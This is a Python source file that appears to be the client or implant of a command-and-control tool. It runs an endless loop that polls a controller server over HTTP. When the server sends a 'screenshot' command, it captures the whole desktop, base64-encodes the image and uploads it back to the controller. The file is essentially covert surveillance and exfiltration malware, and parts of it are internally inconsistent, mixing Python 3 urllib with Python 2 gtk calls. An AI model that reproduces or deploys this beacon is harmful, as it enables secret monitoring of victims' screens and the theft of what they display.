#!/usr/bin/env python

import getopt, sys, urllib.request, select, json, base64

from src.configuration import loadNodeConfig, Configuration
loadNodeConfig()

from src.logger import log
from src.database import *
from src.utils import request, IMAGE

toSubmit = []

def take_screenshot():
    ret = ""
    # https://stackoverflow.com/questions/69645/take-a-screenshot-via-a-python-script-linux
    try:
        import gtk.gdk
        w = gtk.gdk.get_default_root_window()
        sz = w.get_size()
        pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
        pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
        if (pb != None):
            pb.save("/tmp/screenshot.png", "png")
            f = open("/tmp/screenshot.png", "r")
            ret = base64.b64encode(f.read())
    except Exception as e:
        print(str(e))
        ret = IMAGE
    return ret


def request(res, data = None):
    h = urllib.request.Request(
        Configuration()['node.plain'] + res,
        data = json.dumps(data).encode(),
        headers={'Content-Type': 'application/json'}
    )
    return urllib.request.urlopen(h).read()


def usage():
    print (" -p/--pool <type>\t\t Make a pool request.")
    sys.exit()


def pooling(t):
    # FIXME: dns is not yet ready.
    global toSubmit
    log(0, "Pooling using: " + PoolingLogs.poolingName(t))
    d = None
    if len(toSubmit) > 0:
        d = toSubmit.pop()
    print("Submitting: " + str(d))
    res = request('/pool/' + Configuration()['node.id'], data = d)
    j = json.loads(res)
    for i in j:
        if 'command' in i:
            try:
                jj = json.loads(i['command'])
                if 'name' in jj and jj['name'] == "screenshot":
                    log(0, "Taking screenshot...")
                    d = {
                        "cmd":  i['id'],
                        "data": take_screenshot()
                    }
                    toSubmit.append(d)
                    print("adding to the list...")
            except Exception as e:
                print(str(e))
                pass
        else:
            print(str(i))
    


def main():
    t = None
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hp:", ["help", "pool="])
        for o, a in opts:
            if o in ("-p", "--pool"):
                if a == "dns":
                    t = PoolingLogs.TYPE_DNS
                else:
                    t = PoolingLogs.TYPE_HTTP
            elif o in ("-h", "--help"):
                usage()

    except getopt.GetoptError as err:
        pass

    timeout = 2
    while True:
        select.select([], [], [], timeout)
        log(0, "pooling...")
        pooling(t)


if __name__ == "__main__":
    main()

